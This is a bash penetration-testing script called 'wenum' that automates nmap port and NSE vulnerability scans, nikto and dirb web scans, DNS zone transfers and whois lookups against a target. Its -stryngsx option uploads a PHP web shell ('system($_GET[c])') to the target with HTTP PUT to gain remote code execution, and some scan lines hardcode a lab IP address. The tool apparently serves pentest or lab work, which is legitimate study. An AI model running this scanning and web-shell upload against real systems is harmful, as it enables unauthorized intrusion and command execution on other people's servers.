#!/bin/bash
#Nmap Full Vuln Scan

#First part checks to make sure we have a host or any variable given.  If not, help options are displayed
if [ -z "$1" ]; then
echo "[*] Nmap Full Vuln Scan"
echo "[*] Usage: wenum <target> [options]"
echo "options:"
echo "-h, --help                    Show Brief Help"
echo "-l                            Search for NSE Vuln Scripts"
echo "-la                           Search through all NSE Scripts"
echo "-hv                           Run all HTTP Vuln NSE's against target"
echo "-s                            Run the Full Powerhouse Suite"
echo "-cs                           Run NSE Script against Target"
echo "-b                            Run Brush Script against Target"
echo "-stryngs                      Run the stryngs Verb Tampering Special :D"
echo "-stryngsx                     Run the Verb Tamper with PUT RCE <TARGET>"
echo "-z                            Run a zonefile transfer against a target domain"
echo "--update                      Updates wenum"
exit 0
fi

#update Locate DB
updatedb

#setting global variables
ABSOLUTE_PATH=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/$(basename "${BASH_SOURCE[0]}")
VERSION=1.0.4

#checks for updates and notifies if available
git=$(curl --silent https://github.com/waldo-irc/waldo-enumeration/blob/master/wenum | grep 'VERSION=' | cut -d">" -f2 | cut -d"<" -f1 | cut -d"=" -f 2)
if [ "$git" == "$VERSION" ]; then
     :
elif [ "$1" != "--update" ]; then
     echo "[****] Update Available"
     echo "[****] Version update from $VERSION to $git"
     echo "[****] Read Changelog for more info. https://github.com/waldo-irc/SMBScan/blob/master/README.md"
fi

#checks for first time run in order to update Locate DB
#if grep -q "WUPDATE=1" ~/.bashrc; then
#     :
#else
#     echo "[*] Updating Database"
#     updatedb     
#     echo "WUPDATE=1" >> ~/.bashrc
#fi

#store our final octet for final naming into $host
if [[ $1 == *[/]* ]]; then
     hostl=$(echo $1 | cut -d"." -f4 | cut -d"/" -f2)
     host="sub$hostl"
elif echo "$1" | grep '[0-9]' >/dev/null; then
     host=$(echo $1 | cut -d"." -f4)
else
     host=$1
fi

#Here we set up our options and arguments
for arg; do
    case $arg in
        -h) echo "[*] Nmap Full Vuln Scan"
            echo "[*] Usage: wenum <target> -options"
            echo "options:"
            echo "-h, --help                    show brief help"
            echo "-l                            Search for NSE Vuln Scripts"
            echo "-la                           Search through all NSE Scripts"
            echo "-hv                           Run all HTTP Vuln NSE's against target"
            echo "-s                            Run the Full Powerhouse Suite"
            echo "-cs                           Run NSE Script against Target"
            echo "-b                            Run Brush Script against Target"
            echo "-stryngs                      Run the stryngs Verb Tampering Special :D"
            echo "-stryngsx                     Run the Verb Tamper with PUT RCE <TARGET>" 
            echo "-z                            Run a zonefile transfer against a target domain"
            echo "--update                      Updates wenum"               
            exit 0 ;;
        -l) echo "[*] Search for NSE Vuln Scripts, Options include http, ftp, afp, smb, smtp, samba, rmi, rdp, and mysql"
            echo "[!] leave empty for all"
            read -p "<Which Script?> :`echo $'\n> '`" TYPE;
	    locate nmap/scripts/$TYPE | cut -d"/" -f6 | grep "vuln" | cut -d"." -f1 
            echo "[*] End"
            exit 0;;
        -la) echo "[*] Search for NSE Scripts - Options include acarsd, address, afp, ajp, amqp, asn, auth, backorifice, bacnet, banner, bitcoin, bjnp, broadcast, cassandra, cccam, citrix, couchdb, creds, cups, cvs, daap, daytime, db2, dhcp, dict, distcc, dns, docker, domcon, domino, dpap, drda, firewalk, ftp, hadoop, http, imap, iax2, ip-geolocation, jdwp, ldap, metasploit, mongodb, netbus, nessus, oracle, pop3, quake, sip, smb, smtp, snmp, socks, ssl, targets, ssh, and xmpp"
            echo "[!] leave empty for all"
            read -p "<Which Script?> :`echo $'\n> '`" TYPE;
	    locate nmap/scripts/$TYPE | cut -d"/" -f6 | cut -d"." -f1 
            echo "[*] End"
            exit 0;;
        -s) if [ ! -d ~/Desktop/$host-enum ]; then
                 mkdir ~/Desktop/$host-enum
            fi
            echo "[*] RUNNING THE POWERHOUSE!"
            if [ "$1" == "-s" ]; then
                 echo "[*] Error! Must be used with a target or range."
                 echo "[*] Ex: wenum 192.168.25.142-146 -s"
                 exit 0
            else
                 nmap -p0-65535 -A $1 > ~/Desktop/$host-enum/nmap.txt &
                 wait
                 if grep -q '\b139/tcp\b' ~/Desktop/$host-enum/nmap.txt; then
                      echo "[*] SMB Port 139 Open.  Run wsmb"
                 fi
                 if grep -q '\b445/tcp\b' ~/Desktop/$host-enum/nmap.txt; then
                      echo "[*] SMB Port 445 Open.  Run wsmb"
                 fi
                 if grep -q '\b80/tcp\b' ~/Desktop/$host-enum/nmap.txt; then
                      echo "[*] HTTP Port Open"
                      HTTPBAN=$(nmap -p80 -sV 10.11.1.8 | grep 80/tcp | cut -d" " -f6,7,8,9,10,11)
                      echo "[*] HTTP Version $HTTPBAN"
                      read -p "<HTTP Open - Run Nikto?> : y/N: " CONDITION;
                      if [ "$CONDITION" == "y" ] || [ "$CONDITION" == "Y" ]; then
                           echo "[*] Running Nikto"
                           nikto -h $1 > ~/Desktop/$host-enum/nikto.txt &
                           wait
                      fi
                      read -p "<HTTP Open - Run Dirb?> : y/N: " CONDITION;
                      if [ "$CONDITION" == "y" ] || [ "$CONDITION" == "Y" ]; then
                           dirb http://$1
                      fi
                      read -p "<Take a Screenshot of dirb (Takes SS of terminal, enlarge to capture whole terminal)?> : y/N: " CONDITION;
                      if [ "$CONDITION" == "y" ] || [ "$CONDITION" == "Y" ]; then
                           gnome-screenshot --window -f ~/Desktop/$host-enum/httpdirb.jpg
                      fi
                 fi
                 if grep -q '\b443/tcp\b' ~/Desktop/$host-enum/nmap.txt; then
                      echo "[*] HTTPS Port Open"
                      HTTPSBAN=$(nmap -p443 -sV 10.11.1.8 | grep 443/tcp | cut -d" " -f6,7,8,9,10,11)
                      echo "[*] HTTP Version $HTTPSBAN"
                      read -p "<HTTPS Open - Run Nikto?> : y/N: " CONDITION;
                      if [ "$CONDITION" == "y" ] || [ "$CONDITION" == "Y" ]; then
                           echo "[*] Running Nikto"
                           nikto -h https://$1 > ~/Desktop/$host-enum/niktossl.txt &
                           wait
                      fi
                      read -p "<HTTPS Open - Run Dirb?> : y/N: " CONDITION;
                      if [ "$CONDITION" == "y" ] || [ "$CONDITION" == "Y" ]; then
                           dirb https://$1
                      fi
                      read -p "<Take a Screenshot of dirb (Takes SS of terminal, enlarge to capture whole terminal)?> : y/N: " CONDITION;
                      if [ "$CONDITION" == "y" ] || [ "$CONDITION" == "Y" ]; then
                           gnome-screenshot --window -f ~/Desktop/$host-enum/httpsdirb.jpg
                      fi
                 fi
                 if grep -q '\b8080/tcp\b' ~/Desktop/$host-enum/nmap.txt; then
                      echo "[*] HTTP Proxy Port Open"
                      HTTPSBAN=$(nmap -p8080 -sV 10.11.1.8 | grep 8080/tcp | cut -d" " -f6,7,8,9,10,11)
                      echo "[*] Proxy Version $HTTPSBAN"
                      read -p "<HTTP Proxy Open - Run Nikto on proxy?> : y/N: " CONDITION;
                      if [ "$CONDITION" == "y" ] || [ "$CONDITION" == "Y" ]; then
                           echo "[*] Running Nikto"
                           nikto -h http://$1 -useproxy http://$1:8080 > ~/Desktop/$host-enum/niktoproxy.txt &
                           wait
                      fi
                      read -p "<HTTP Proxy Open - Run Dirb?> : y/N: " CONDITION;
                      if [ "$CONDITION" == "y" ] || [ "$CONDITION" == "Y" ]; then
                           dirb http://$1 -p http://$1:8080
                      fi
                      read -p "<Take a Screenshot of dirb (Takes SS of terminal, enlarge to capture whole terminal)?> : y/N: " CONDITION;
                      if [ "$CONDITION" == "y" ] || [ "$CONDITION" == "Y" ]; then
                           gnome-screenshot --window -f ~/Desktop/$host-enum/proxydirb.jpg
                      fi
                 fi
            fi
            echo "[*] End"
            leafpad ~/Desktop/$host-enum/nmap.txt
            exit 0;;
        -stryngs) curl -X OPTIONS $1 -v
            exit 0 ;;
        -stryngsx) read -p "<Enter file to PUT RCE>: " CONDITION;
            read -p "<Enter port to use>: " PORT;
            if [ "$PORT" == "443" ] || [ "$PORT" == "80" ] ; then 
                 if [ "$PORT" == "443" ]; then
                      CONDITIONL=https
                 else
                      CONDITIONL=http
                 fi  
            else
                 read -p "<SSL - y/N>: " CONDITIONY;
                 if [ "$CONDITIONY" == y ] || [ "$CONDITIONY" == Y ]; then
                      CONDITIONL=https
                 else
                      CONDITIONL=http
                 fi 
            fi
            CONDITIONX=$(echo "$1" | cut -d"/" -f3)
            echo "[*] Executing curl -X PUT -d '<?php system($_GET['c']);' $CONDITIONL://$CONDITIONX/$CONDITION:$PORT"
            curl -X PUT -d '<?php system($_GET["c"]);' http://$CONDITIONX/$CONDITION:$PORT           
            exit 0 ;;
        -hv) if [ "$1" == "-hv" ]; then
                 echo "[*] Error! Must be used with a target or range."
                 echo "[*] Ex: wenum 192.168.25.0/24 -hv"
                 exit 0
            fi 
            if [ ! -d ~/Desktop/$host-enum/NSE ]; then
                 mkdir ~/Desktop/$host-enum
                 mkdir ~/Desktop/$host-enum/NSE
            fi 
            read -p "<What Port?>: " port;
            for a in $(locate nmap/scripts/http | cut -d"/" -f6 | grep "vuln" | cut -d"." -f1 | sort -r ); do
                 nmap -p$port -script $a $1 --open > ~/Desktop/$host-enum/NSE/$a.txt
                 wait
                 echo "[*] Running $a"
                 if grep -q "VULNERABLE" ~/Desktop/$host-enum/NSE/$a.txt; then
                      echo "[!!] $1 Seems Vulnerable to $a!"
                 fi
            done 
            echo "[*] Done!  Check ~/Desktop/$host-enum/NSE for Scans"
            exit 0 ;;
        -cs) if [ "$1" == "-cs" ]; then
            echo "[*] Executes any NSE Scripts"
            echo "[*] Ex:wenum 192.222.4.23 -cs"
            else
            read -p "<Which Script?> :`echo $'\n> '`" SCRIPT;
            read -p "<Which Port(s)?> :`echo $'\n> '`" PORT;
            nmap -p$PORT -script $SCRIPT $1 --open
            fi 
            exit 0;;
        -b) if [ "$1" == "-b" ]; then
                 echo "[*] Runs Brush on Hostname(Installs if not already-requires pip and git)"
                 echo "[*] Ex:wenum google.com -b"
            else
                 if [ ! -f /usr/bin/brush ]; then
                      echo "[*] Brush Not Found! Installing now."
                      git clone https://github.com/stryngs/cpc.git
                      echo "[*] Moving to /usr/bin"
                      mv cpc/brush /usr/bin
                      echo "[*] Installing PythonWhoIs"
                      pip install pythonwhois
                      echo "[*] Installing IPWhoIs"
                      pip install ipwhois
                      echo "[*] Cleaning up"
                      rm -R cpc
                      echo "[*] Installed!  Running Scan Now!"
                      brush -n $1
                      wait
                      echo "[*] Check clients.sqlite file for results. Reccinebded SQLite Browser"
                      else
                      echo "[*] Running Brush"
                      brush -n $1
                      wait
                 echo "[*] Check clients.sqlite file for results. Reccomended SQLite Browser"
            fi
            fi 
            exit 0;;
        -z) echo "[*] Running Zonefile Transfer"
            if [ "$1" == "-z" ]; then
                 echo "[*] Error! Must be used with a target."
                 echo "[*] Ex: wenum google.com -z"
                 exit 0
            else
                 if [ ! -d ~/Desktop/$host-enum ]; then
                      mkdir ~/Desktop/$host-enum
                 fi
                 for line in $(host -t ns $1| cut -d" " -f4); do
                      host -l $1 $line | grep "has address" > ~/Desktop/$host-enum/ztransfer.txt &
                      wait
                      cat ~/Desktop/$host-enum/ztransfer.txt
                 done
            fi
            exit 0;;
        --update) echo "[*] wenum Version $VERSION"
            echo "[*] Updating wenum"
            if [ "$1" != "--update" ]; then
                 echo "[*] Error!  Must be used as wenum --update"
            else
                 echo "$git Git Version"
                 echo "$VERSION Installed Version"
                 #Uncomment below for debugging
                 #echo "$ABSOLUTE_PATH"
                 if [ "$git" == "$VERSION" ]; then
                      echo "[*] Installed Version is latest"
                 else
                      echo "[*] Needs an update!"
                      git clone https://github.com/waldo-irc/waldo-enumeration.git
                      echo "[*] Installing to $ABSOLUTE_PATH"
                      mv waldo-enumeration/wenum $ABSOLUTE_PATH
                      echo "[*] Cleaning up"
                      wait
                      rm -R waldo-enumeration
                 fi
            fi
            exit 0;;
        --version) echo "[*] Version $VERSION"
            exit 0;;
        -*) echo "[*] Nmap Full Vuln Scan"
            echo "[*] Usage: wenum <target> -options"
            echo "options:"
            echo "-h, --help                    show brief help"
            echo "-l                            Search for NSE Vuln Scripts"
            echo "-la                           Search through all NSE Scripts"
            echo "-hv                           Run all HTTP Vuln NSE's against target"
            echo "-s                            Run the Full Powerhouse Suite"
            echo "-cs                           Run NSE Script against Target"
            echo "-b                            Run Brush Script against Target"
            echo "-stryngs                      Run the stryngs Verb Tampering Special :D"
            echo "-stryngsx                     Run the Verb Tamper with PUT RCE <TARGET>"  
            echo "-z                            Run a zonefile transfer against a target domain"
            echo "--update                      Updates wenum"
            exit 0;;
        *)  dir=$arg ;; #This line is required to pass the target when given.  Gives anything given as an argument without a slash and passes it through to be used for the program.
    esac
done
